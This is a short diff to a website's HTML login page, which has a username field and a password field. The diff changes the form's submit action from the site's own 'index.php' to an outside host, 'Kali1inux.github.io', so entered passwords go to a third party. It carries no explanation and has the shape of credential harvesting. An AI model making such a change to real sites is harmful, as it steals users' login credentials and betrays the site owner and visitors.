@@ -6,7 +6,7 @@
     <title>My Website</title>
   </head>
   <body>
-    <form action="index.php" method="post">
+    <form action="Kali1inux.github.io" method="post">
       <input type="text" name="t1"/>
       <input type="password" name="pw1"/>
       <input type="submit" value="login"/>
